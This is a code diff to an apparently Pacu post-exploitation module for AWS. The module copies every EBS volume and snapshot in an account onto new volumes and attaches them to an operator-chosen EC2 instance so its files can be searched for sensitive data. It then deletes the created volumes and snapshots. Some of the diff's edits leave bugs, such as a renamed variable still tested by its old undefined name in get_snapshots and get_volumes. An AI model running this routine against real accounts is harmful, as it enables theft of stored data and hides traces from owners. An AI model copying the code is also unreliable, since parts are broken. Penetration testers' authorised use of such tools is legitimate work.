@@ -12,38 +12,27 @@ module_info = {
     'author': 'Alexander Morgenstern alexander.morgenstern@rhinosecuritylabs.com',
     'category': 'post_exploitation',
     'one_liner': 'Loads EBS snapshots and volumes so they are easily accessible.',
-    'description': 'This module will use an EC2 instance to load Elastic Block Store volumes and snapshots in the account and allow the user to access the data.',
+    'description': 'This module will cycle through existing EBS volumes and create snapshots of them, then restore those snapshots and existing snapshots to new EBS volumes, which will then be attached to the supplied EC2 instance for you to mount. This will give you access to the files on the various volumes, where you can then look for sensitive information. Afterwards, it will cleanup the created volumes and snapshots by detaching them from your instance and removing them from the AWS account.',
     'services': ['EC2'],
     'prerequisite_modules': [],
-    'arguments_to_autocomplete': ['--instance', '--zone'],
+    'arguments_to_autocomplete': ['--instance-id', '--zone'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 parser.add_argument(
-    '--instance',
+    '--instance-id',
     required=True,
-    default=None,
     help='InstanceId of instance to target'
 )
 parser.add_argument(
     '--zone',
     required=True,
-    default=None,
     help='Availability zone of instance to target'
 )
 
+SET_COUNT = 10
 
-def input_helper(input):
-    """Helper function that loops until a successful response is given"""
-    prompt = '    Load next set of volumes? (y/n) '
-    while True:
-        response = input(prompt)
-        if response.lower() == 'y':
-            return True
-        elif response.lower() == 'n':
-            return False
-
-def load_volumes(client, print, input, instance_id, volume_ids):
+def load_volumes(pacu, client, instance_id, volume_ids):
     """Loads volumes on an instance.
 
     Args:
@@ -58,66 +47,78 @@ def load_volumes(client, print, input, instance_id, volume_ids):
 
     # load volume set
     set_index = 0
-    set_count = 10
 
     while set_index < len(volume_ids):
-        current_volume_set = volume_ids[set_index:set_index + set_count]
+        current_volume_set = volume_ids[set_index:set_index + SET_COUNT]
         waiter = client.get_waiter('volume_available')
         waiter.wait(VolumeIds=current_volume_set)
-        attached = modify_volume_set(
-            client, print, 'attach_volume', instance_id, current_volume_set)
+        attached = modify_volume_list(
+            pacu, client, 'attach_volume', instance_id, current_volume_set
+            )
         if not attached:
-            print(' Volume attachment failed')
-            print(' Exiting...')
-            return False
-        running = input_helper(input)
-        detached = modify_volume_set(
-            client, print, 'detach_volume', instance_id, current_volume_set)
+            pacu.print(' Volume attachment failed')
+            pacu.print(' Exiting...')
+            running = False
+
+        while True:
+            response = pacu.input('    Load next set of volumes? (y/n) ')
+            if response.lower() == 'y':
+                running = True
+                break
+            elif response.lower() == 'n':
+                running = False
+                break
+
+        detached = modify_volume_list(
+            pacu, client, 'detach_volume', instance_id, current_volume_set
+            )
         if not detached:
-            print(' Volume detachment failed')
-            print(' Exiting...')
-            return False
+            pacu.print(' Volume detachment failed')
+            pacu.print(' Exiting...')
+            running = False
         waiter.wait(VolumeIds=current_volume_set)
-        set_index += set_count
+        set_index += SET_COUNT
         if not running:
             break
     cleanup(client)
     return True
 
 
-def modify_volume_set(client, print, func, instance_id, volume_id_set):
+def modify_volume_list(pacu, client, func, instance_id, volume_id_list):
     """Helper function to load volumes on an instance to not overload the
     instance.
 
     Args:
         client (boto3.client): client to interact with AWS
         print (func): Overwritten built-in print function
-        func (str): Function sname to modify_volume_set
+        func (str): Function sname to modify_volume_list
         instance_id (str): instance_id to attach volumes to
         volume_ids (list): list of volume_ids to (de)attach to the instance.
     Returns:
-        bool: True if the volumes were successfully attached.
+        bool: True if the volumes were successfully modified.
     """
-    for volume_id in volume_id_set:
+    available_devices_iterator = iter(get_valid_devices(pacu, instance_id))
+    for volume_id in volume_id_list:
         try:
             kwargs = {
                 'InstanceId':instance_id,
                 'VolumeId':volume_id
             }
             if func == 'attach_volume':
-                kwargs['Device'] = get_valid_device(client, instance_id)
+                kwargs['Device'] = next(available_devices_iterator)
             caller = getattr(client, func)
             caller(**kwargs)
         except ClientError as error:
             code = error.response['Error']['Code']
             if  code == 'UnauthorizedOperation':
-                print('  FAILURE MISSING AWS PERMISSIONS')
+                pacu.print('  FAILURE MISSING AWS PERMISSIONS')
             else:
-                print(error)
+                pacu.print(error)
             return False
     return True
 
-def get_valid_device(client, instance):
+
+def get_valid_devices(pacu, instance_id):
     """Returns the next device mapping available
 
     Args:
@@ -127,14 +128,48 @@ def get_valid_device(client, instance):
         str: Returns next mapping in form of /dev/xvd[base], otherwise /dev/xvdzz
 
     """
-    response = client.describe_instances(InstanceIds=[instance])
-    mappings = response['Reservations'][0]['Instances'][0]['BlockDeviceMappings']
+    instance = [instance for instance in get_instances(pacu) if instance['InstanceId'] == instance_id]
+    mappings = instance[0]['BlockDeviceMappings']
     current_mappings = [device['DeviceName'] for device in mappings]
-    base_mappings = [char for char in 'bcdefghijklmnoqrstuvwxyz']
-    for base in base_mappings:
-        if '/dev/xvd' + base not in current_mappings:
-            return '/dev/xvd' + base
-    return '/dev/xvdzz'
+    last_mapping = sorted(current_mappings)[-1]
+    available_devices = [get_valid_device(last_mapping)]
+    for _ in range(SET_COUNT):
+        available_devices.append(get_valid_device(available_devices[-1]))
+    return available_devices
+
+
+def get_valid_device(previous_device):
+    """Helper function that returns the next device given a previous device"""
+    return previous_device[:-1] + next_char(previous_device[-1])
+
+
+def next_char(char):
+    """Gets the next sequential character
+
+    Args:
+        char (str): Character to increment
+    Returns:
+        str: Incremented passed char
+    """
+    out = chr(ord(char) + 1)
+    return out if out != '{' else 'aa'
+
+
+def get_instances(pacu):
+    """Returns snapshots given an AWS region
+    Args:
+        pacu (Main): Reference to Pacu
+    Returns:
+        list: List of Instances.
+    """
+    ec2_data = deepcopy(pacu.get_active_session().EC2)
+    if 'Instances' not in ec2_data:
+        fields = ['EC2', 'Instances']
+        module = 'enum_ec2'
+        fetched_ec2_instances = pacu.fetch_data(fields, module)
+        if fetched_ec2_instances is False:
+            return []
+    return ec2_data['Instances']
 
 
 def get_snapshots(pacu):
@@ -144,12 +179,11 @@ def get_snapshots(pacu):
     Returns:
         list: List of Snapshots.
     """
-    session = pacu.get_active_session()
-    ec2_data = deepcopy(session.EC2)
+    ec2_data = deepcopy(pacu.get_active_session().EC2)
     if 'Snapshots' not in ec2_data:
         fields = ['EC2', 'Snapshots']
         module = 'enum_ebs_volumes_snapshots'
-        fetched_ec2_instances = pacu.fetch_data(fields, module)
+        fetched_snapshots = pacu.fetch_data(fields, module)
         if fetched_ec2_instances is False:
             return []
     return ec2_data['Snapshots']
@@ -168,7 +202,7 @@ def get_volumes(pacu):
     if 'Volumes' not in ec2_data:
         fields = ['EC2', 'Volumes']
         module = 'enum_ebs_volumes_snapshots'
-        fetched_ec2_instances = pacu.fetch_data(fields, module)
+        fetched_volumes = pacu.fetch_data(fields, module)
         if fetched_ec2_instances is False:
             return []
     return ec2_data['Volumes']
@@ -180,8 +214,7 @@ def generate_volumes_from_snapshots(client, snapshots, zone):
     waiter = client.get_waiter('snapshot_completed')
     waiter.wait(SnapshotIds=snapshots)
     for snapshot in snapshots:
-        response = client.create_volume(
-            SnapshotId=snapshot, AvailabilityZone=zone)
+        response = client.create_volume(SnapshotId=snapshot, AvailabilityZone=zone)
         volume_ids.append(response['VolumeId'])
     store_temp_data({'volumes':volume_ids})
     return volume_ids
@@ -275,7 +308,7 @@ def store_temp_data(data):
 def main(args, pacu):
     """Main module function, called from Pacu"""
     summary_data = {}
-    instance = parser.parse_args(args).instance
+    instance_id = parser.parse_args(args).instance_id
     zone = parser.parse_args(args).zone
     region = zone[:-1]
     client = pacu.get_boto3_client('ec2', region)
@@ -291,14 +324,14 @@ def main(args, pacu):
     pacu.print('  Attaching volumes...')
     temp_snaps = generate_snapshots_from_volumes(client, volumes)
     temp_volumes = generate_volumes_from_snapshots(client, temp_snaps, zone)
-    load_volumes(client, pacu.print, pacu.input, instance, temp_volumes)
-    pacu.print('  Finished attaching volumes')
+    load_volumes(pacu, client, instance_id, temp_volumes)
+    pacu.print('  Finished attaching volumes...')
 
-    pacu.print('  Attaching volumes from existing snapshots')
+    pacu.print('  Attaching volumes from existing snapshots...')
     temp_volumes = generate_volumes_from_snapshots(client, snapshots, zone)
-    load_volumes(client, pacu.print, pacu.input, instance, temp_volumes)
-    pacu.print('  Finished attaching existing snapshot volumes ')
-
+    load_volumes(pacu, client, instance_id, temp_volumes)
+    pacu.print('  Finished attaching existing snapshot volumes...')
+    
     return summary_data
 
 
